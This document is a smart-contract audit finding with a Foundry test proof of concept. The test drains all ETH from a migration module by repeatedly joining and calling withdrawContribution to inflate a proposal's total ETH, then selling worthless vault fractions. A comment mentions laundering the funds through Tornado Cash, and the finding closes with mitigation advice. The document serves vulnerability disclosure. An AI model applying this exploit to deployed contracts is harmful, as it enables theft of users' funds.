# Vulnerability details

## Impact
All ETH can be stolen from the migration module contract.

## Proof of Concept
```
    function testExploit() public {
        initializeMigration(alice, bob, TOTAL_SUPPLY, HALF_SUPPLY, true);
        alice.ferc1155 = new FERC1155BS(address(0), 111, token);

        (nftReceiverSelectors, nftReceiverPlugins) = initializeNFTReceiver();
        // Migrate to a vault with no permissions (just to test out migration)
        address[] memory newModules = new address[](2);

        newModules[0] = migration;
        newModules[1] = modules[1];

        // Migration module has lots of ETH that comes from many users joining various proposals.
        vm.deal(migration, 1000 ether);

        // Alice starts with 10 ETH. It doesn't really matter, she can start with zero and use flash loans.
        vm.deal(alice.addr, 10 ether);

        assertEq(getETHBalance(migration), 1000 ether);
        assertEq(getETHBalance(alice.addr), 10 ether);

        // Alice creates a new vault with help of the BaseVault protoform.
        // All fractions are minted to her, so now she has full supply of them.
        // These fractions shouldn't be valuable becasue they aren't backed by anything (no tokens in the vault).
        address worthlessVault = alice.baseVault.deployVault(
            TOTAL_SUPPLY,
            modules,
            nftReceiverPlugins,
            nftReceiverSelectors,
            mintProof
        );

        // get tokenId of our new vault
        (token, tokenId) = registry.vaultToToken(worthlessVault);

        // Alice makes the proposal
        alice.migrationModule.propose(
            worthlessVault,
            newModules,
            nftReceiverPlugins,
            nftReceiverSelectors,
            TOTAL_SUPPLY * 2,
            999 ether
        );

        // Alice manipulates proposal.totalEth by calling withdrawContribution at wrong time repeatedly
        for (uint256 i = 0; i < 100; i++) {
            alice.migrationModule.join{value: 10 ether}(
                worthlessVault,
                tokenId,
                0
            );
            alice.migrationModule.withdrawContribution(worthlessVault, tokenId);
        }

        // Now Alice commits the proposal and starts a buyout with a very attractive fractionPrice.
        // Namely, the full supply of fractions that she just minted is now worth all ETH stored in the migration contract.
        vm.warp(proposalPeriod + 1);
        bool started = alice.migrationModule.commit(worthlessVault, tokenId);
        assertTrue(started);

        // Alice sells all her fractions for this "very attractive" price. Then she sends them to her Tornado Cash and disappears.
        alice.ferc1155.setApprovalForAll(buyout, true);
        alice.buyoutModule.sellFractions(worthlessVault, TOTAL_SUPPLY);

        // Make sure there's no ETH left in the migration module
        assertEq(getETHBalance(migration), 0 ether);
        assertEq(getETHBalance(alice.addr), 1010 ether);
    }
```

## Tools Used
Foundry

## Recommended Mitigation Steps
Add checks to ensure that `withdrawContribution` can be called only when it’s supposed to.

Consider also correctly updating `proposal.totalEth` and `proposal.totalFractions` in this function. Just in case.

